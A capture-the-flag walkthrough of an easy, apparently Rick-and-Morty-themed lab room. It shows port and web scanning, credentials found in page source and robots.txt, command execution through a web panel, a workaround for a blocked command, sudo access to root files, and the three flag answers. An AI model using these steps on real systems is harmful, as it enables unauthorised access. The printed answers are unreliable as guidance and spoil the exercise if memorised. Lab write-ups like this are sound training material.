### Difficulty: EASY

### Keywords and tools: nmap, nikto, dirb, directory traversal


#ping the target (target IP will be given after you've joined the room)

ping 10.10.102.120 
PING 10.10.102.120 (10.10.102.120) 56(84) bytes of data.
64 bytes from 10.10.102.120: icmp_seq=1 ttl=63 time=49.4 ms
64 bytes from 10.10.102.120: icmp_seq=2 ttl=63 time=50.7 ms

#nmap scan

sudo nmap -sV -n -v -Pn -p- -T4 -A 10.10.102.120

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9a:68:bd:7f:44:89:05:be:36:ef:62:91:91:3c:8b:f3 (RSA)
|   256 f3:57:4b:4d:59:dd:42:6e:01:d9:b6:7e:8b:d5:72:8b (ECDSA)
|_  256 3a:9e:61:c3:73:1a:f0:4c:de:a3:39:79:d5:b5:f3:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool


#connect to web app with Firefox
#inspect the page source 

<!--

    Note to self, remember username!

    Username: R1ckRul3s

-->


#Check /robots.txt
Wubbalubbadubdub

#Maybe a password?
#Let's try ssh.


ssh R1ckRul3s@10.10.102.120
R1ckRul3s@10.10.102.120: Permission denied (publickey).

#No success. Will need ssh key.
  
  

#scan the target for possibly hidden content with dirb
dirb http://10.10.102.120/

#nothing special found, lets try nikto
nikto -h 10.10.102.120

#nikto found an /login.php page, lets see it and try to login

username: R1ckRul3s
password: Wubbalubbadubdub

#we get a command panel with a command execution box, lets try typing 'whoami'
www-data
ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

cat Sup3rS3cretPickl3Ingred.txt
Command disabled

#open the page with Firefox: http://10.10.102.120/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

#and we have our first flag


#open the http://10.10.102.120/clue.txt
Look around the file system for the other ingredient.

#lets try directory traversal
cd ../../../../; ls

#works, lets explore home

cd /home; ls
cd /home/rick; ls

#we see 'second ingredients', and since cat-command is disabled, lets try 'less'

less /home/rick/"second ingredients"
jerry tear

#now we got our second flag


#lets see if we have sudo

sudo ls /root;
sudo less /root/3rd.txt

3rd ingredients: fleeb juice

#we got all 3 flags.
